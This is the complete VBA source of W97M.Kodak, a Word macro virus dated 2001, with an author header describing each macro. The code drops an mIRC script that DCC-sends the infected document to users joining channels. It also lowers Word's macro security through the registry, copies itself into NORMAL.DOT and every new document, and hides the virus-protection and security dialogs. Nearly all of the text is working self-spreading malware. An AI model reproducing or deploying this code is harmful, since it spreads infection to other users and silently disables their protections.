' Name : W97M.Kodak
' Author : PetiK
' Date : June 5th 2001
' Size 3,030 bytes
'
' Macro AutoOpen : Create a “script.ini” file for mIRC. If the day is the 5th
' the virus display a Baloon Message. It copies itself to /Windows/Kodak.doc.
'
' Macro AutoClose : It alters the security in Word 9.0 and 10.0 (2000 and XP)
' It copies his code into the file “Kodak.vxd” and put it in the “NORMAL.DOT”.
' When a new file is create, the code of the macro is writes in this file.
' To avoid infect two times “NORMAL.DOT”, the virus adds the value :
'       HKEY_LOCAL_MACHINE\Software\Microsoft\W97M.Kodak = CliClac
'
' Macro HelpAbout : Display an other Baloon Message
'
' Macro ViewVBCode : Display a Message Box and shoxs Visual Basic Editor
'
' Macro ToolsOptions and Security : Find yourself.


'W97M.Kodak by PetiK 05/10/2001
Sub AutoOpen()
On Error Resume Next
ActiveDocument.SaveAs FileName:="C:\Windows\Kodak.doc"
ActiveDocument.Saved = True
Open "C:\script.drv" For Output As #1
Print #1, "n0=on 1:JOIN:#:{"
Print #1, "n1= /if ( $nick == $me ) { halt }"
Print #1, "n2= /.dcc send $nick C:\Windows\Kodak.doc"
Print #1, "n3=}"
Close #1
FileSystem.FileCopy "C:\script.drv", "C:\mirc\script.ini"
FileSystem.FileCopy "C:\script.drv", "C:\mirc32\script.ini"
FileSystem.FileCopy "C:\script.drv", "C:\progra~1\mirc\script.ini"
FileSystem.FileCopy "C:\script.drv", "C:\progra~1\mirc32\script.ini"
FileSystem.Kill "C:\script.drv"
If Day(Now) = 5 Then
With Application.Assistant
    .Visible = True
End With
With Assistant.NewBalloon
    .Text = "I am always here. And you, are you here."
    .Heading = "W97M.Kodak"
    .Animation = msoAnimationGetAttentionMajor
    .Button = msoButtonSetOK
    .Show
End With
End If
End Sub

Sub AutoClose()
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> 1& Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End If
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") <> 1& Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
End If
If Dir("C:\Kodak.vxd", vbReadOnly) = "" Then
Open "C:\Kodak.vxd" For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
K = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Print #1, K
Next i
Close #1
SetAttr "C:\Kodak.vxd", vbReadOnly
End If
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\", "W97M.Kodak") <> "ClicClac" Then
NormalTemplate.VBProject.VBComponents.Import "C:\Kodak.vxd"
NormalTemplate.Save
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\", "W97M.Kodak") = "ClicClac"
End If

ActiveDocument.VBProject.VBComponents.Import "C:\Kodak.vxd"
ActiveDocument.Save
End Sub

Sub HelpAbout()
With Application.Assistant
    .Visible = True
End With
With Assistant.NewBalloon
    .Text = "Smile and cheese for the photo"
    .Heading = "W97M.Kodak"
    .Animation = msoAnimationGetAttentionMajor
    .Button = msoButtonSetOK
    .Show
End With
End Sub

Sub ViewVBCode()
MsgBox "was coded by PetiK(c)2001", vbInformation, "W97M.Kodak"
ShowVisualBasicEditor = True
End Sub

Sub ToolsOptions()
    On Error Resume Next
    Options.VirusProtection = 1
    Options.SaveNormalPrompt = 1
    Dialogs(wdDialogToolsOptions).Show
    Options.VirusProtection = 0
    Options.SaveNormalPrompt = 0
End Sub

Sub ToolsSecurity()
On Error Resume Next
CommandBars("Macro").Controls("Security...").Enabled = True
Dialogs(wdDialogToolsSecurity).Show
CommandBars("Macro").Controls("Security...").Enabled = False
End Sub

